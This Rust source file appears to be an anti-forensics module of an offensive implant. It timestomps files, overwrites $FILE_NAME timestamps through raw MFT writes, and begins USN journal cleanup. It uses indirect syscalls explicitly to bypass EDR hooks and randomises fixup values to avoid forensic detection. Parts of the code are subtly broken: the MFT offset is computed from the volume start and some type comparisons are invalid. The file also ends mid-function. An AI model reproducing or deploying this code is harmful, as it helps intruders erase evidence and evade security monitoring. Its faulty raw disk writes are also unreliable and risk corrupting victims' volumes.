// ── MFT Timestamp Synchronisation & USN Journal Cleanup ────────────────
//
// NTFS stores file timestamps in TWO MFT attributes:
//
//   - $STANDARD_INFORMATION ($SI, type 0x10) — CreationTime, LastAccessTime,
//     LastWriteTime, ChangeTime.  Modifiable via NtSetInformationFile with
//     FileBasicInformation.  This is what tools like "touch" and classic
//     timestompers modify.
//
//   - $FILE_NAME ($FN, type 0x30) — Same four FILETIME fields, but stored
//     inside the MFT record's filename attribute.  Most forensic tools
//     (MFT Analyzer, fls, Timestomp Examiner) compare $SI vs $FN timestamps.
//     A mismatch indicates timestomping.  Modifying $FN requires raw MFT
//     access — there is no documented API for it.
//
// This module:
//
//   1. Reads the reference file's timestamps via NtQueryInformationFile.
//   2. Applies them to $SI via NtSetInformationFile(FileBasicInformation).
//   3. Optionally modifies $FN by parsing and patching the raw MFT entry:
//        a. Open volume handle via NtOpenFile(\??\C:).
//        b. Locate the MFT record number via NtQueryInformationFile(FileInternalInformation).
//        c. Read the MFT record using NtFsControlFile(FSCTL_GET_RETRIEVAL_POINTERS)
//           as a side-channel to locate the record, then read raw volume.
//        d. Parse the MFT record, locate $FN (type 0x30), overwrite the
//           4 FILETIME fields, recalculate MFT fixup values, write back.
//   4. Cleans USN journal entries referencing the modified file.
//
// All NT API calls use indirect syscalls via nt_syscall to bypass user-mode
// hooks set by EDR products.
//
// Reference: NTFS documentation (MFT record layout, fixup values, attribute
// types 0x10 and 0x30).

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::OnceLock;

use common::config::TimestampConfig;

// ── Constants ────────────────────────────────────────────────────────────

/// NTSTATUS success codes.
const STATUS_SUCCESS: i32 = 0;
const STATUS_PENDING: i32 = 0x00000103_u32 as i32;
const STATUS_NOT_FOUND: i32 = 0xC0000225_u32 as i32;

/// NT access mask constants.
const SYNCHRONIZE: u32 = 0x100000;
const GENERIC_READ: u32 = 0x80000000;
const GENERIC_WRITE: u32 = 0x40000000;
const FILE_ANY_ACCESS: u32 = 0x00000000;

/// File share modes.
const FILE_SHARE_READ: u32 = 0x00000001;
const FILE_SHARE_WRITE: u32 = 0x00000002;
const FILE_SHARE_DELETE: u32 = 0x00000004;

/// File creation dispositions.
const FILE_OPEN: u32 = 0x00000001;

/// File attributes / flags.
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
const FILE_WRITE_THROUGH: u32 = 0x00000002;
const FILE_NO_INTERMEDIATE_BUFFERING: u32 = 0x00000008;

/// Section access masks.
const SECTION_ALL_ACCESS: u32 = 0x000F0000 | 0x0000000F;

/// Section inheritance.
const SEC_COMMIT: u32 = 0x08000000;
const PAGE_READWRITE: u32 = 0x04;

/// File information classes.
const FILE_BASIC_INFORMATION: u32 = 4;
const FILE_INTERNAL_INFORMATION: u32 = 6;
const FILE_STANDARD_INFORMATION: u32 = 5;

/// FSCTL codes.
const FSCTL_GET_RETRIEVAL_POINTERS: u32 = 0x00090073;
const FSCTL_READ_USN_JOURNAL: u32 = 0x000900BB;
const FSCTL_WRITE_USN_CLOSE: u32 = 0x000900EF;
const FSCTL_DELETE_USN_JOURNAL: u32 = 0x000900CE;
const FSCTL_CREATE_USN_JOURNAL: u32 = 0x000900E7;
const FSCTL_READ_FILE_USN_DATA: u32 = 0x000900EB;

/// USN reasons we care about (file creation/modification/deletion/write).
const USN_REASON_DATA_OVERWRITE: u32 = 0x00000001;
const USN_REASON_DATA_TRUNCATION: u32 = 0x00000002;
const USN_REASON_NAMED_DATA_OVERWRITE: u32 = 0x00000010;
const USN_REASON_FILE_CREATE: u32 = 0x00000100;
const USN_REASON_FILE_DELETE: u32 = 0x00000200;
const USN_REASON_EA_CHANGE: u32 = 0x00000400;
const USN_REASON_SECURITY_CHANGE: u32 = 0x00000800;
const USN_REASON_RENAME_OLD_NAME: u32 = 0x00001000;
const USN_REASON_RENAME_NEW_NAME: u32 = 0x00002000;
const USN_REASON_INDEXABLE_CHANGE: u32 = 0x00004000;
const USN_REASON_BASIC_INFO_CHANGE: u32 = 0x00008000;
const USN_REASON_HARD_LINK_CHANGE: u32 = 0x00010000;
const USN_REASON_COMPRESSION_CHANGE: u32 = 0x00020000;
const USN_REASON_ENCRYPTION_CHANGE: u32 = 0x00040000;
const USN_REASON_OBJECT_ID_CHANGE: u32 = 0x00080000;
const USN_REASON_REPARSE_POINT_CHANGE: u32 = 0x00100000;
const USN_REASON_STREAM_CHANGE: u32 = 0x00200000;
const USN_REASON_TRANSACTED_CHANGE: u32 = 0x00400000;
const USN_REASON_INTEGRITY_CHANGE: u32 = 0x00800000;
const USN_REASON_DESIRED_STORAGE_CLASS_CHANGE: u32 = 0x01000000;
const USN_REASON_CLOSE: u32 = 0x80000000;

/// MFT attribute type constants.
const ATTR_TYPE_STANDARD_INFORMATION: u32 = 0x10;
const ATTR_TYPE_FILE_NAME: u32 = 0x30;
const ATTR_TYPE_END: u32 = 0xFFFFFFFF;

/// MFT record signature "FILE".
const MFT_RECORD_SIGNATURE: [u8; 4] = [b'F', b'I', b'L', b'E'];

/// MFT record size (standard 1024 bytes).
const MFT_RECORD_SIZE: usize = 1024;

/// Maximum USN journal buffer size for reading.
const USN_JOURNAL_BUF_SIZE: usize = 65536;

/// Maximum iterations for USN journal scanning (anti-loop).
const MAX_USN_ITERATIONS: usize = 20;

/// Default NTFS volume for MFT raw access.
const DEFAULT_VOLUME_NT: &[u16] = encode_wide!("\\??\\C:");

// ── Internal state ───────────────────────────────────────────────────────

/// Module configuration, set once during init.
static CONFIG: OnceLock<TimestampConfig> = OnceLock::new();

/// Whether the module has been initialised.
static INITIALIZED: AtomicBool = AtomicBool::new(false);

// ── NT structure definitions ─────────────────────────────────────────────
//
// Minimal NT structures needed for our syscalls.  Defined locally to
// maintain exact layout control for cross-compilation (x86_64-pc-windows-gnu
// from Linux host).

#[repr(C)]
#[derive(Default)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: *mut std::ffi::c_void,
    object_name: *mut UnicodeString,
    attributes: u32,
    security_descriptor: *mut std::ffi::c_void,
    security_quality_of_service: *mut std::ffi::c_void,
}

impl ObjectAttributes {
    fn new(name: &mut UnicodeString) -> Self {
        Self {
            length: std::mem::size_of::<Self>() as u32,
            root_directory: std::ptr::null_mut(),
            object_name: name as *mut UnicodeString,
            attributes: 0x40, // OBJ_CASE_INSENSITIVE
            security_descriptor: std::ptr::null_mut(),
            security_quality_of_service: std::ptr::null_mut(),
        }
    }
}

#[repr(C)]
#[derive(Default)]
struct IoStatusBlock {
    status: i32,
    information: usize,
}

/// FILE_BASIC_INFORMATION — used with NtSetInformationFile / NtQueryInformationFile
/// (FileBasicInformation = class 4).
#[repr(C)]
#[derive(Default, Clone, Copy)]
struct FileBasicInformation {
    creation_time: i64,
    last_access_time: i64,
    last_write_time: i64,
    change_time: i64,
    file_attributes: u32,
}

/// FILE_INTERNAL_INFORMATION — used with NtQueryInformationFile (class 6)
/// to retrieve the MFT file reference number (index number).
#[repr(C)]
#[derive(Default)]
struct FileInternalInformation {
    index_number: i64,
}

/// USN journal data for FSCTL_READ_USN_JOURNAL.
#[repr(C)]
#[derive(Default)]
struct ReadUsnJournalData {
    start_usn: i64,
    reason_mask: u32,
    return_only_on_close: u32,
    timeout: i64,
    bytes_to_wait_for: u32,
    usn_journal_id: u64,
    min_major_version: u16,
    max_major_version: u16,
}

/// USN record header (V2/V3/V4 — we use the common V2 layout).
#[repr(C)]
#[derive(Default)]
struct UsnRecordV2 {
    record_length: u32,
    major_version: u16,
    minor_version: u16,
    file_reference_number: u64,
    parent_file_reference_number: u64,
    usn: i64,
    timestamp: i64,
    reason: u32,
    source_info: u32,
    security_id: u32,
    file_attributes: u32,
    file_name_length: u16,
    file_name_offset: u16,
    file_name: [u16; 1],
}

/// CREATE_USN_JOURNAL_DATA for FSCTL_CREATE_USN_JOURNAL.
#[repr(C)]
#[derive(Default)]
struct CreateUsnJournalData {
    maximum_size: u64,
    allocation_delta: u64,
}

/// DELETE_USN_JOURNAL_DATA for FSCTL_DELETE_USN_JOURNAL.
#[repr(C)]
#[derive(Default)]
struct DeleteUsnJournalData {
    usn_journal_id: u64,
    delete_flags: u32,
}

// ── Macro to encode Rust string as UTF-16 with null terminator ─────────

macro_rules! encode_wide {
    ($s:expr) => {{
        const _INPUT: &str = $s;
        const _LEN: usize = _INPUT.len();
        const _OUTPUT: &[u16; _LEN + 1] = {
            let mut buf = [0u16; _LEN + 1];
            let bytes = _INPUT.as_bytes();
            let mut i = 0;
            while i < _LEN {
                buf[i] = bytes[i] as u16;
                i += 1;
            }
            buf[_LEN] = 0u16;
            &buf
        };
        _OUTPUT
    }};
}

// ── Helper: wide string from Rust string ─────────────────────────────────

/// Build a null-terminated UTF-16 vector from a Rust string.
fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

/// Build a UnicodeString from a UTF-16 buffer.
fn make_unicode_string(buf: &mut [u16]) -> UnicodeString {
    let len = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
    UnicodeString {
        length: (len * 2) as u16,
        maximum_length: (buf.len() * 2) as u16,
        buffer: buf.as_mut_ptr(),
    }
}

/// Convert a UTF-16 slice to a Rust String (lossy).
fn wide_to_string(wide: &[u16]) -> String {
    String::from_utf16_lossy(wide)
}

/// Convert a Rust string path to NT path format (prepend "\??\").
fn to_nt_path(path: &str) -> Vec<u16> {
    if path.starts_with('\\') {
        to_wide(path)
    } else {
        to_wide(&format!("\\??\\{}", path))
    }
}

/// Convert a UTF-16 path to NT path format if it doesn't already start with one.
fn ensure_nt_path(path: &[u16]) -> Vec<u16> {
    // Check if path already starts with \??\  or \??\
    if path.len() >= 4 {
        let starts_with_nt = (path[0] == '\\' && path[1] == '?' && path[2] == '?' && path[3] == '\\')
            || (path[0] == '\\' && path[1] == 'D' && path[2] == 'e' && path[3] == 'v');
        if starts_with_nt {
            return path.to_vec();
        }
    }
    // Prepend \??\
    let mut result = vec![b'\\' as u16, b'?' as u16, b'?' as u16, b'\\' as u16];
    // Skip any leading drive letter like "C:" — we need \??\C:\...
    result.extend_from_slice(path);
    result.push(0);
    result
}

// ── defer! macro (scope-guard, same as prefetch.rs) ────────────────────

/// RAII-style defer for cleanup.  Executes the closure when the guard drops.
/// Self-contained scope guard — no external crate dependency.
/// Matches the pattern used throughout forensic_cleanup.
macro_rules! defer {
    ($($body:stmt);+ $(;)?) => {
        struct _DeferGuard<F: FnMut()>(core::mem::ManuallyDrop<F>);
        impl<F: FnMut()> Drop for _DeferGuard<F> {
            fn drop(&mut self) {
                let mut f = unsafe { core::mem::ManuallyDrop::take(&mut self.0) };
                f();
            }
        }
        let _guard = _DeferGuard(core::mem::ManuallyDrop::new(|| { $($body);+ }));
    };
}

// ── Indirect syscall wrappers ────────────────────────────────────────────
//
// These wrappers encapsulate the nt_syscall calls with proper NT structure
// setup.  Each wrapper handles the full NT API contract.  All syscalls use
// indirect dispatch through nt_syscall to bypass user-mode hooks.

/// Open a file handle via NtCreateFile (indirect syscall).
unsafe fn nt_open_file(
    path: &[u16],
    desired_access: u32,
    create_disposition: u32,
    create_options: u32,
) -> Result<*mut std::ffi::c_void, String> {
    let mut handle: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut path_vec = path.to_vec();
    let mut obj_name = make_unicode_string(&mut path_vec);
    let mut obj_attrs = ObjectAttributes::new(&mut obj_name);
    let mut iosb = IoStatusBlock::default();

    let status = syscall!(
        "NtCreateFile",
        &mut handle as *mut _ as u64,
        desired_access as u64,
        &mut obj_attrs as *mut _ as u64,
        &mut iosb as *mut _ as u64,
        0u64,                                          // AllocationSize
        0u64,                                          // FileAttributes
        (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE) as u64,
        create_disposition as u64,
        create_options as u64,
        0u64,                                          // EaBuffer
        0u64,                                          // EaLength
    )
    .map_err(|e| format!("nt_syscall resolution for NtCreateFile: {e}"))?;

    if status != STATUS_SUCCESS {
        return Err(format!(
            "NtCreateFile failed: NTSTATUS {:#010X}",
            status as u32
        ));
    }
    Ok(handle)
}

/// Close a handle via NtClose (indirect syscall).
unsafe fn nt_close(handle: *mut std::ffi::c_void) -> Result<(), String> {
    if handle.is_null() {
        return Ok(());
    }
    let status = syscall!("NtClose", handle as u64)
        .map_err(|e| format!("nt_syscall resolution for NtClose: {e}"))?;
    if status != STATUS_SUCCESS {
        return Err(format!("NtClose failed: NTSTATUS {:#010X}", status as u32));
    }
    Ok(())
}

/// Query file basic information via NtQueryInformationFile (indirect syscall).
unsafe fn nt_query_basic_info(
    file_handle: *mut std::ffi::c_void,
) -> Result<FileBasicInformation, String> {
    let mut info = FileBasicInformation::default();
    let mut iosb = IoStatusBlock::default();

    let status = syscall!(
        "NtQueryInformationFile",
        file_handle as u64,
        &mut iosb as *mut _ as u64,
        &mut info as *mut _ as u64,
        std::mem::size_of::<FileBasicInformation>() as u64,
        FILE_BASIC_INFORMATION as u64,
    )
    .map_err(|e| format!("nt_syscall resolution for NtQueryInformationFile: {e}"))?;

    if status != STATUS_SUCCESS {
        return Err(format!(
            "NtQueryInformationFile(FileBasicInformation) failed: NTSTATUS {:#010X}",
            status as u32
        ));
    }
    Ok(info)
}

/// Set file basic information via NtSetInformationFile (indirect syscall).
unsafe fn nt_set_basic_info(
    file_handle: *mut std::ffi::c_void,
    info: &FileBasicInformation,
) -> Result<(), String> {
    let mut iosb = IoStatusBlock::default();

    let status = syscall!(
        "NtSetInformationFile",
        file_handle as u64,
        &mut iosb as *mut _ as u64,
        info as *const FileBasicInformation as *mut FileBasicInformation as u64,
        std::mem::size_of::<FileBasicInformation>() as u64,
        FILE_BASIC_INFORMATION as u64,
    )
    .map_err(|e| format!("nt_syscall resolution for NtSetInformationFile: {e}"))?;

    if status != STATUS_SUCCESS {
        return Err(format!(
            "NtSetInformationFile(FileBasicInformation) failed: NTSTATUS {:#010X}",
            status as u32
        ));
    }
    Ok(())
}

/// Query file internal information (MFT index number) via NtQueryInformationFile.
unsafe fn nt_query_internal_info(
    file_handle: *mut std::ffi::c_void,
) -> Result<i64, String> {
    let mut info = FileInternalInformation::default();
    let mut iosb = IoStatusBlock::default();

    let status = syscall!(
        "NtQueryInformationFile",
        file_handle as u64,
        &mut iosb as *mut _ as u64,
        &mut info as *mut _ as u64,
        std::mem::size_of::<FileInternalInformation>() as u64,
        FILE_INTERNAL_INFORMATION as u64,
    )
    .map_err(|e| format!("nt_syscall resolution for NtQueryInformationFile(Internal): {e}"))?;

    if status != STATUS_SUCCESS {
        return Err(format!(
            "NtQueryInformationFile(FileInternalInformation) failed: NTSTATUS {:#010X}",
            status as u32
        ));
    }
    Ok(info.index_number)
}

/// Read file data via NtReadFile (indirect syscall).
unsafe fn nt_read_file(
    file_handle: *mut std::ffi::c_void,
    buffer: &mut [u8],
    offset: Option<i64>,
) -> Result<usize, String> {
    let mut iosb = IoStatusBlock::default();
    let mut byte_offset = offset.unwrap_or(0);

    let status = syscall!(
        "NtReadFile",
        file_handle as u64,
        0u64,                              // Event
        0u64,                              // ApcRoutine
        0u64,                              // ApcContext
        &mut iosb as *mut _ as u64,
        buffer.as_mut_ptr() as u64,
        buffer.len() as u64,
        &mut byte_offset as *mut _ as u64,
        0u64,                              // Key
    )
    .map_err(|e| format!("nt_syscall resolution for NtReadFile: {e}"))?;

    if status != STATUS_SUCCESS && status != STATUS_PENDING {
        return Err(format!(
            "NtReadFile failed: NTSTATUS {:#010X}",
            status as u32
        ));
    }
    Ok(iosb.information as usize)
}

/// Write file data via NtWriteFile (indirect syscall).
unsafe fn nt_write_file(
    file_handle: *mut std::ffi::c_void,
    buffer: &[u8],
    offset: Option<i64>,
) -> Result<usize, String> {
    let mut iosb = IoStatusBlock::default();
    let mut byte_offset = offset.unwrap_or(0);

    let status = syscall!(
        "NtWriteFile",
        file_handle as u64,
        0u64,                              // Event
        0u64,                              // ApcRoutine
        0u64,                              // ApcContext
        &mut iosb as *mut _ as u64,
        buffer.as_ptr() as u64,
        buffer.len() as u64,
        &mut byte_offset as *mut _ as u64,
        0u64,                              // Key
    )
    .map_err(|e| format!("nt_syscall resolution for NtWriteFile: {e}"))?;

    if status != STATUS_SUCCESS && status != STATUS_PENDING {
        return Err(format!(
            "NtWriteFile failed: NTSTATUS {:#010X}",
            status as u32
        ));
    }
    Ok(iosb.information as usize)
}

/// Send an FSCTL via NtFsControlFile (indirect syscall).
unsafe fn nt_fs_control_file(
    file_handle: *mut std::ffi::c_void,
    fs_control_code: u32,
    input_buffer: *mut std::ffi::c_void,
    input_buffer_length: u32,
    output_buffer: *mut std::ffi::c_void,
    output_buffer_length: u32,
) -> Result<IoStatusBlock, String> {
    let mut iosb = IoStatusBlock::default();

    let status = syscall!(
        "NtFsControlFile",
        file_handle as u64,
        0u64,                              // Event
        0u64,                              // ApcRoutine
        0u64,                              // ApcContext
        &mut iosb as *mut _ as u64,
        fs_control_code as u64,
        input_buffer as u64,
        input_buffer_length as u64,
        output_buffer as u64,
        output_buffer_length as u64,
    )
    .map_err(|e| format!("nt_syscall resolution for NtFsControlFile: {e}"))?;

    if status != STATUS_SUCCESS && status != STATUS_PENDING {
        return Err(format!(
            "NtFsControlFile(0x{:08X}) failed: NTSTATUS {:#010X}",
            fs_control_code, status as u32
        ));
    }
    Ok(iosb)
}

/// Enumerate files in a directory via NtQueryDirectoryFile (indirect syscall).
/// Returns a vector of file names (UTF-16 strings, without null terminator).
unsafe fn nt_enumerate_files(
    dir_handle: *mut std::ffi::c_void,
) -> Result<Vec<Vec<u16>>, String> {
    let mut results = Vec::new();
    let buf_size: usize = 4096;
    let mut buffer = vec![0u8; buf_size];

    loop {
        let mut iosb = IoStatusBlock::default();

        let status = syscall!(
            "NtQueryDirectoryFile",
            dir_handle as u64,
            0u64,                              // Event
            0u64,                              // ApcRoutine
            0u64,                              // ApcContext
            &mut iosb as *mut _ as u64,
            buffer.as_mut_ptr() as u64,
            buf_size as u64,
            1u64,   // FileDirectoryInformation (class = 1)
            0u64,   // ReturnSingleEntry = FALSE
            0u64,   // FileName (null = resume)
            0u64,   // RestartScan = FALSE
        )
        .map_err(|e| format!("nt_syscall resolution for NtQueryDirectoryFile: {e}"))?;

        // STATUS_NO_MORE_FILES
        if status == 0x80000006_u32 as i32 {
            break;
        }
        if status != STATUS_SUCCESS {
            return Err(format!(
                "NtQueryDirectoryFile failed: NTSTATUS {:#010X}",
                status as u32
            ));
        }

        let bytes_returned = iosb.information as usize;
        if bytes_returned == 0 || bytes_returned > buf_size {
            break;
        }

        // Parse the linked list of FileDirectoryInformation entries.
        let mut offset: usize = 0;
        loop {
            if offset + 64 > bytes_returned {
                break;
            }

            // FileDirectoryInformation layout:
            //   +0x00: NextEntryOffset (u32)
            //   +0x04: FileIndex (u32)
            //   +0x08: CreationTime (i64)
            //   +0x10: LastAccessTime (i64)
            //   +0x18: LastWriteTime (i64)
            //   +0x20: ChangeTime (i64)
            //   +0x28: EndOfFile (i64)
            //   +0x30: AllocationSize (i64)
            //   +0x38: FileAttributes (u32)
            //   +0x3C: FileNameLength (u32)
            //   +0x40: FileName[1] (u16)
            let entry_ptr = buffer.as_ptr().add(offset);
            let next_entry_offset = u32::from_le_bytes(std::slice::from_raw_parts(entry_ptr.add(0), 4).try_into().unwrap());
            let file_name_length = u32::from_le_bytes(std::slice::from_raw_parts(entry_ptr.add(0x3C), 4).try_into().unwrap()) as usize;
            let file_name_offset = 0x40usize;

            if file_name_length > 0 && offset + file_name_offset + file_name_length <= bytes_returned {
                let name_ptr = entry_ptr.add(file_name_offset) as *const u16;
                let name_len = file_name_length / 2;
                let name_slice = std::slice::from_raw_parts(name_ptr, name_len);
                results.push(name_slice.to_vec());
            }

            if next_entry_offset == 0 {
                break;
            }
            offset += next_entry_offset as usize;
        }
    }

    Ok(results)
}

// ── MFT record parsing and patching ──────────────────────────────────────
//
// The NTFS Master File Table (MFT) stores one record per file.  Each record
// is 1024 bytes (standard) and contains a sequence of attributes.  The
// $FILE_NAME attribute (type 0x30) contains 4 FILETIME fields that most
// timestompers miss.
//
// MFT record layout:
//   +0x00: Signature "FILE" (4 bytes)
//   +0x04: FixupOffset (u16)
//   +0x06: FixupCount (u16) — includes the signature entry
//   +0x08: LSN (i64)
//   +0x10: SequenceNumber (u16)
//   +0x12: HardLinkCount (u16)
//   +0x14: FirstAttributeOffset (u16)
//   +0x16: Flags (u16) — 0x01 = in-use, 0x02 = directory
//   +0x18: UsedSize (u32)
//   +0x1C: TotalSize (u32)
//   ...attributes follow at FirstAttributeOffset...
//
// MFT attribute header (non-resident flag = 0 for resident):
//   +0x00: Type (u32) — e.g. 0x30 for $FILE_NAME
//   +0x04: TotalLength (u32) — including this header
//   +0x08: NonResident (u8) — 0 = resident
//   +0x09: NameLength (u8)
//   +0x0A: NameOffset (u16)
//   +0x0C: Flags (u16)
//   +0x0E: AttributeNumber (u16)
//   +0x10: ContentLength (u32) — for resident attributes
//   +0x14: ContentOffset (u16) — offset from attribute start to content
//
// $FILE_NAME attribute content (at ContentOffset from attribute start):
//   +0x00: ParentDirectory (8 bytes — file reference)
//   +0x08: CreationTime (FILETIME, 8 bytes)
//   +0x10: LastWriteTime (FILETIME, 8 bytes) — misnamed "LastModificationTime"
//   +0x18: ChangeTime (FILETIME, 8 bytes) — "LastChangeTime"
//   +0x20: LastAccessTime (FILETIME, 8 bytes)
//   +0x28: AllocationSize (i64)
//   +0x30: RealSize (i64)
//   +0x38: Flags (u32)
//   +0x3C: ReparseValue (u32)
//   +0x40: NameLength (u8)
//   +0x41: NameNamespace (u8)
//   +0x42: FileName (variable, UTF-16)
//
// MFT fixup: At every 512-byte boundary, the original 2 bytes are replaced
// with the fixup value from the header.  We must apply and remove fixup
// values when reading/writing MFT records.

/// Find a resident attribute by type in an MFT record.
/// Returns (attribute_offset, content_offset, content_length) relative to record start.
fn find_mft_attribute(record: &[u8], attr_type: u32) -> Option<(usize, usize, usize)> {
    if record.len() < 48 {
        return None;
    }

    // Validate "FILE" signature.
    if record[0..4] != MFT_RECORD_SIGNATURE {
        return None;
    }

    let first_attr_offset = u16::from_le_bytes([record[0x14], record[0x15]]) as usize;
    if first_attr_offset < 48 || first_attr_offset >= record.len() {
        return None;
    }

    let mut offset = first_attr_offset;
    loop {
        if offset + 24 > record.len() {
            break;
        }

        let current_type = u32::from_le_bytes([
            record[offset],
            record[offset + 1],
            record[offset + 2],
            record[offset + 3],
        ]);

        // End marker.
        if current_type == ATTR_TYPE_END || current_type == 0 {
            break;
        }

        let total_length = u32::from_le_bytes([
            record[offset + 4],
            record[offset + 5],
            record[offset + 6],
            record[offset + 7],
        ]) as usize;
        if total_length == 0 {
            break;
        }

        if current_type == attr_type {
            let non_resident = record[offset + 8];
            if non_resident == 0 {
                // Resident attribute.
                let content_length = u32::from_le_bytes([
                    record[offset + 0x10],
                    record[offset + 0x11],
                    record[offset + 0x12],
                    record[offset + 0x13],
                ]) as usize;
                let content_offset = u16::from_le_bytes([
                    record[offset + 0x14],
                    record[offset + 0x15],
                ]) as usize;
                return Some((offset, content_offset, content_length));
            }
            // Non-resident $FILE_NAME is extremely rare; skip.
        }

        offset += total_length;
        // Align to 8-byte boundary.
        offset = (offset + 7) & !7;
    }

    None
}

/// Remove MFT fixup values from a record, restoring original bytes at
/// sector boundaries (every 512 bytes).  The fixup offset/count are at
/// record +0x04 and +0x06.
fn remove_mft_fixup(record: &mut [u8]) -> Result<(), String> {
    if record.len() < 48 {
        return Err("MFT record too short for fixup".to_string());
    }
    if record[0..4] != MFT_RECORD_SIGNATURE {
        return Err("Invalid MFT record signature".to_string());
    }

    let fixup_offset = u16::from_le_bytes([record[0x04], record[0x05]]) as usize;
    let fixup_count = u16::from_le_bytes([record[0x06], record[0x07]]) as usize;

    if fixup_count < 2 || fixup_offset + (fixup_count as usize) * 2 > record.len() {
        return Err("Invalid fixup offset/count".to_string());
    }

    // The fixup array is: [original_value_at_sector1_end, original_value_at_sector2_end, ...]
    // At offset fixup_offset we have the "signature" value that was written at each boundary.
    // At fixup_offset+2 we have the original bytes for sector 1 boundary,
    // at fixup_offset+4 for sector 2 boundary, etc.
    let signature = u16::from_le_bytes([record[fixup_offset], record[fixup_offset + 1]]);

    for i in 1..fixup_count as usize {
        let sector_boundary = (i * 512) - 2; // Last 2 bytes of each sector
        if sector_boundary + 2 > record.len() {
            break;
        }

        let current_value = u16::from_le_bytes([
            record[sector_boundary],
            record[sector_boundary + 1],
        ]);

        // Verify the signature matches.
        if current_value != signature {
            log::warn!(
                "timestamps: MFT fixup signature mismatch at sector {} (expected {:#06X}, found {:#06X})",
                i, signature, current_value
            );
        }

        // Restore original bytes from fixup array.
        let original_offset = fixup_offset + (i * 2);
        if original_offset + 2 <= record.len() {
            record[sector_boundary] = record[original_offset];
            record[sector_boundary + 1] = record[original_offset + 1];
        }
    }

    Ok(())
}

/// Apply MFT fixup values to a record before writing back.
/// Replaces the last 2 bytes of each sector with the fixup signature
/// and stores the originals in the fixup array.
fn apply_mft_fixup(record: &mut [u8]) -> Result<(), String> {
    if record.len() < 48 {
        return Err("MFT record too short for fixup".to_string());
    }
    if record[0..4] != MFT_RECORD_SIGNATURE {
        return Err("Invalid MFT record signature".to_string());
    }

    let fixup_offset = u16::from_le_bytes([record[0x04], record[0x05]]) as usize;
    let fixup_count = u16::from_le_bytes([record[0x06], record[0x07]]) as usize;

    if fixup_count < 2 || fixup_offset + (fixup_count as usize) * 2 > record.len() {
        return Err("Invalid fixup offset/count".to_string());
    }

    // Generate a random signature value unique to this record.
    // A fixed signature (e.g. 0x4946) is a forensic indicator — an examiner
    // can grep all MFT records for that value.  We avoid 0x0000 and 0xFFFF
    // which NTFS itself uses for special purposes.
    let signature: u16 = loop {
        let s = rand::random::<u16>();
        if s != 0x0000 && s != 0xFFFF {
            break s;
        }
    };

    // Write the signature at fixup_offset.
    record[fixup_offset] = (signature & 0xFF) as u8;
    record[fixup_offset + 1] = ((signature >> 8) & 0xFF) as u8;

    for i in 1..fixup_count as usize {
        let sector_boundary = (i * 512) - 2;
        if sector_boundary + 2 > record.len() {
            break;
        }

        // Save original bytes in fixup array.
        let save_offset = fixup_offset + (i * 2);
        if save_offset + 2 <= record.len() {
            record[save_offset] = record[sector_boundary];
            record[save_offset + 1] = record[sector_boundary + 1];
        }

        // Write signature at sector boundary.
        record[sector_boundary] = (signature & 0xFF) as u8;
        record[sector_boundary + 1] = ((signature >> 8) & 0xFF) as u8;
    }

    Ok(())
}

/// Patch the $FILE_NAME timestamps in an MFT record with the given cover times.
/// The record must already have fixup values removed.
fn patch_fn_timestamps(
    record: &mut [u8],
    creation_time: i64,
    last_write_time: i64,
    change_time: i64,
    last_access_time: i64,
) -> Result<bool, String> {
    match find_mft_attribute(record, ATTR_TYPE_FILE_NAME) {
        Some((attr_offset, content_offset, _content_length)) => {
            let fn_content_start = attr_offset + content_offset;

            // $FILE_NAME content layout:
            //   +0x08: CreationTime (8 bytes)
            //   +0x10: LastWriteTime (8 bytes) — "LastModificationTime"
            //   +0x18: ChangeTime (8 bytes)
            //   +0x20: LastAccessTime (8 bytes)
            let offsets_and_values: &[(usize, i64)] = &[
                (fn_content_start + 0x08, creation_time),
                (fn_content_start + 0x10, last_write_time),
                (fn_content_start + 0x18, change_time),
                (fn_content_start + 0x20, last_access_time),
            ];

            for &(offset, value) in offsets_and_values {
                if offset + 8 <= record.len() {
                    record[offset..offset + 8].copy_from_slice(&value.to_le_bytes());
                } else {
                    log::warn!(
                        "timestamps: $FN timestamp offset {} out of bounds (record len {})",
                        offset,
                        record.len()
                    );
                    return Ok(false);
                }
            }

            log::debug!(
                "timestamps: patched $FN timestamps (creation={:#018X}, write={:#018X}, change={:#018X}, access={:#018X})",
                creation_time as u64, last_write_time as u64, change_time as u64, last_access_time as u64
            );
            Ok(true)
        }
        None => {
            log::warn!("timestamps: no $FILE_NAME attribute found in MFT record");
            Ok(false)
        }
    }
}

/// Read an MFT record from raw volume access.
/// Uses NtReadFile on the volume handle at the byte offset corresponding
/// to the MFT record number.
unsafe fn read_mft_record(
    volume_handle: *mut std::ffi::c_void,
    mft_record_number: i64,
) -> Result<Vec<u8>, String> {
    // MFT record number maps to byte offset: record_number * MFT_RECORD_SIZE.
    // For standard 1024-byte MFT records:
    let byte_offset = mft_record_number * (MFT_RECORD_SIZE as i64);
    let mut record = vec![0u8; MFT_RECORD_SIZE];

    let bytes_read = nt_read_file(volume_handle, &mut record, Some(byte_offset))?;
    if bytes_read < MFT_RECORD_SIZE {
        return Err(format!(
            "Short read on MFT record {}: got {} bytes, expected {}",
            mft_record_number, bytes_read, MFT_RECORD_SIZE
        ));
    }

    // Validate signature.
    if record[0..4] != MFT_RECORD_SIGNATURE {
        return Err(format!(
            "Invalid MFT record signature at record {}: {:02X?}",
            mft_record_number,
            &record[0..4]
        ));
    }

    Ok(record)
}

/// Write an MFT record back to raw volume access.
unsafe fn write_mft_record(
    volume_handle: *mut std::ffi::c_void,
    mft_record_number: i64,
    record: &[u8],
) -> Result<(), String> {
    let byte_offset = mft_record_number * (MFT_RECORD_SIZE as i64);

    let bytes_written = nt_write_file(volume_handle, record, Some(byte_offset))?;
    if bytes_written < record.len() {
        return Err(format!(
            "Short write on MFT record {}: wrote {} bytes, expected {}",
            mft_record_number, bytes_written, record.len()
        ));
    }

    Ok(())
}

// ── USN Journal cleanup ──────────────────────────────────────────────────

/// Read the current USN journal ID from the volume.
unsafe fn query_usn_journal_id(
    volume_handle: *mut std::ffi::c_void,
) -> Result<u64, String> {
